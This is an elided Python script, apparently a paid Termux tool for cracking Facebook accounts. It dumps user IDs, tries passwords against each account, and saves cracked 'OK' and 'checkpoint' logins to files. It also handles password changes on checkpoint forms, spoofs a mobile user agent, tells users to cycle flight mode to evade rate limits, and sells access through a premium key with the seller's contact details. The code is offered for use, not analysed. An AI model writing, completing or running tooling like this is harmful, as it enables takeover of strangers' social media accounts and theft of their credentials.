...
try:
    rq = requests.get('https://pastebin.com/raw/XpHrZSDP').text
...
### User Agent
ua_intelmac = 'Mozilla/5.0 (Linux; Android 12; RMX3393) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36]'
...
def menu_log():
    ...
    print('%s '%(O))
    if pmu in ['']:jalan('%s [%s!%s] %sDATA CALLECTION ON KOR MADARCHUD'%(M,P,M,P));menu_log()
...
def dump_name(_azimvau_):
    print('%s [%s•%s] %sEXAMPLE : Kausar, Arafat'%(H,P,H,K));__name__ = _cici_azimvau_('%s [%s•%s] %sENTER NAME : '%(H,P,H,K)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
...
def change_pass(user,_req_ses_,_response_,link_2):
    ...
    _password_ = ''.join(_new_pass_);_result_ok_ = "\r %s[%sK4US4R-OK%s] %s • %s%s%s          "%(H,P,H,user,_password_,tahun(user),P);_button_dev_ = ["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for _azimvau_ in _response_("input"):
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    if fl.get("id") in files_cp:pass
                        ...
                        h_cp = "\r %s[%sK4US4R-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                    ...
                    if fl.get("id") in files_ok:pass
                        ...
                        else:print("\r %s[%sK4US4R-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                        self.ada.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
            print("\r %s[%sK4US4R-CRACK%s][%s%s/%s%s][%sK4US4R-OK:%s%s][%sK4US4R-CP:%s%s]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
    ...
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            ...
            try:
                ...
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sK4US4R-OK%s] %s'%(H,P,H,yyy))
        ...
        try:
            cpl = os.listdir("K4US4R-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("K4US4R-CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sK4US4R-CP%s] %s'%(K,P,K,yyy))
...
def cek_result():
    ...
    for memek in buka_baju:
        ...
        _format_ = "\r %s[%sK4US4R-CP%s] %s          "%(K,P,K,kontol)
...
def started():
    ...
    print('%s [%s•%s] %s[%sK4US4R-OK%s] IDS SAVED IN >> %sK4US4R-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sK4US4R-CP%s] IDS SAVED IN >> %sK4US4R-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
    psb('%s [%s•%s] %sON FLIGHT MODE FOR [3 SEC] EVERY 3 SECOND\n'%(H,P,H,B))


def folder():
    try:os.mkdir("K4US4R-CP")
    except:pass
    try:os.mkdir("K4US4R-OK")
    except:pass


def genkey():
	try:
		rn = open('/data/data/com.termux/files/usr/bin/.kausar-cov', 'r').read()
		rb = rn+basesplit
		banner()
		psb('       %s》%s》%s》%sEVERY HUSTLER GET PAY DAY%s《%s《%s《'%(M,H,B,H,B,H,M))
		print("\n\033[0;92m           YOU ARE NOT PREMIUM USER ")
		print("\033[0;92m        FIRST BUY PREMIUM KEY FROM OWNER")
		print("\033[0;92m            SEND THIS KEY TO OWNER \n\n   YOUR KEY : \033[0;92m%s"%(rb))
		print("\033[0;96m   TOOL PRICE : %s350TK "%(H))
		print("\033[0;96m   VALIDITY : %s1 month"%(H))
		print("\033[0;92m          Facebook ID : @MrK4US4R")
		print("\033[0;92m          INSTAGRAM : @bad.boy.kausar\n\n")
		subprocess.check_output(["am", "start", "https://wa.me/+8801612278337"])
		exit()
	except(IOError):
		rb = rx
		open("/data/data/com.termux/files/usr/bin/.kausar-cov","w").write(rb)
		os.system("chmod 777 /data/data/com.termux/files/usr/bin/.kausar-cov")
		banner()
		psb('       %s》%s》%s》%sEVERY HUSTLER GET PAY DAY%s《%s《%s《'%(M,H,B,H,B,H,M))
		print("\n\033[0;92m              YOU ARE NOT PREMIUM USER ")
		print("\033[0;92m           FIRST BUY PREMIUM KEY FROM OWNER")
		print("\033[0;92m               SEND THIS KEY TO OWNER \n\n YOUR KEY : \033[0;92m%s%s"%(rb,basesplit))
		print("\033[0;96m     TOOL PRICE : %s10K"%(H))
		print("\033[0;96m     VALIDITY : %s1 month"%(H))
		print("\033[0;92m             Facebook ID : @MrK4US4R")
		print("\033[0;92m             INSTAGRAM : @bad.boy.kausar\n\n")
		subprocess.check_output(["am", "start", "https://wa.me/+8801612278337"])
...
def keycheck():
    try:
        k = open("/data/data/com.termux/files/usr/bin/.kausar-cov","r").read()
